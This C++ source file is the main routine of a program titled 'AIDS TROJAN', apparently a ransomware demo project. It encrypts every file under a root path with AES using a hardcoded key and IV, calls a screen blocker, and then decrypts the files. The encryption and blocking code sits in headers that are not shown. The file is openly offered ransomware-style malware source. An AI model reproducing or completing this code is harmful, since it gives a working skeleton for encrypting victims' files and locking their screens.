#include <iostream>
#include <string>
#include <conio.h>
#include "service/EncryptorService.h"
#include "service/AESEncryptor.h"
#include "view/ScreenBlocker.h"

using namespace std;
using namespace std::filesystem;

int main (){
    cout << "****************** AIDS TROJAN ******************" << endl;
    string key = "123456789ABCDEF123456789ABCDEF";
    string iv = "112233445566778899AABBCCDDEEFF";

    ScreenBlocker screenBlocker;
    EncryptorService* encryptorService = new AESEncryptor(key, iv);

    encryptorService->encryptFilesIn(encryptorService->getRootPath());

    screenBlocker.blockScreen();

    encryptorService->decryptFilesIn(encryptorService->getRootPath());

    delete encryptorService;
    encryptorService = NULL;
    return 0;
}




